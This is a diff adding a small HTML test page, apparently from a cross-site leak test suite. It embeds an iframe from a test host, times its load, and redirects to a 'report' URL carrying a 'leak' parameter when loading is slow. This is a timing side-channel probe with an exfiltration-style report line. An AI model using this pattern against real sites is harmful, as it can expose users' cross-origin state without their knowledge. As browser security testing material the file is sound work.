@@ -1,0 +1,18 @@
+<iframe src="https://a.test/CSP/c1233067/helper" id="testFrame"></iframe>
+<script>
+  function checkLoadTime() {
+    const iframe = document.getElementById('testFrame');
+    const startTime = performance.now();
+
+    iframe.onload = () => {
+      const endTime = performance.now();
+      const loadTime = endTime - startTime;
+      
+      if (loadTime > 1000) { // Threshold indicating potential error due to large headers
+        document.location.href = "https://a.test/report/?leak=c1233067";
+      }
+    };
+  }
+  
+  checkLoadTime();
+</script>
